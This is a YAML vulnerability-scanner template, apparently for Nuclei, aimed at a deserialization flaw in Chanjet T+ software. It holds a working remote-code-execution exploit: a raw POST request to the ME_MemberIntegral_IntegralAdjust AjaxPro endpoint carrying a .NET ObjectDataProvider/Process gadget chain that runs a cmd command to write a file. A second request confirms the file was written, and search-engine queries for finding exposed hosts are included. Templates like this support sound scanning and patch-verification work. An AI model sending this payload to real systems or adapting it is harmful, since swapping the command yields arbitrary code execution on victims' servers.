id: changjet-tplus-ME-MemberIntegral-IntegralAdjust-rce
info:
  name: 畅捷通 T+ ME_MemberIntegral_IntegralAdjust - rce
  author: leadlife
  severity: critical
  description: 畅捷通 T+ ME_MemberIntegral_IntegralAdjust 反序列化漏洞，可造成任意文件上传
  reference:
    - todo
  metadata:
    verified: true
    hunter-query: app.name="畅捷通 T+"
    fofa-query: icon_hash="-2067519629" || app="畅捷通-TPlus"
  tags: changjet,unserialize,tplus,rce

variables:
  random_str: "{{rand_base(6)}}"
  match_str: "{{md5(random_str)}}"

http:
  - raw:
      - |
        POST /tplus/ajaxpro/Ufida.T.CodeBehind.DR.Member.MemberIntegral.ME_MemberIntegral_IntegralAdjust,App_Code.ashx?method=InitInstance/;/login HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Content-Type: application/x-www-form-urlencoded
        X-Ajaxpro-Method: InitInstance
        Content-Length: 610

        {
          "arges":{
            "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
            "MethodName":"Start",
            "ObjectInstance":{
                "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                "StartInfo": {
                    "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                    "FileName":"cmd", "Arguments":"/c echo ktkfiaekhfdiboyodilj> img/{{random_str}}.txt"
                }
            }
          }
        }
      
      - |+
        GET /tplus/img/{{random_str}}.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains(body_2,'ktkfiaekhfdiboyodilj')"
        condition: and
          
